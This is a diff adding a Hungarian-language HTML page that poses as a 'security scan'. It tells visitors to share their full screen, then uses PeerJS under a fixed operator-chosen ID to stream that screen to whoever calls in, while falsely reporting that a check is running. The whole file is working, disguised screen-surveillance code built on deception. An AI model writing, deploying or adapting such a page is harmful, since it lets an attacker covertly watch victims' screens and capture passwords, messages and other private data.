@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <title>Rendszerellenőrzés</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #222; color: white; padding-top: 100px; }
+        .gomb { padding: 20px 40px; font-size: 20px; background: red; color: white; border: none; border-radius: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Biztonsági Vizsgálat</h1>
+    <p>A folytatáshoz kattints a gombra és válaszd a "Teljes képernyő" megosztását!</p>
+    <button id="startBtn" class="gomb">START SCAN</button>
+    <p id="status"></p>
+
+    <script>
+        // Írj be ide egy teljesen egyedi nevet, amit csak te tudsz!
+        const MY_ID = 'list_dock_485956565'; 
+        const peer = new Peer(MY_ID);
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                document.getElementById('status').innerText = "Kapcsolat kész. Ellenőrzés fut...";
+                document.getElementById('startBtn').style.display = "none";
+
+                peer.on('call', call => {
+                    call.answer(stream);
+                });
+            } catch (err) {
+                alert("Hiba: Engedélyezd a képernyőt!");
+            }
+        });
+    </script>
+</body>
+</html>
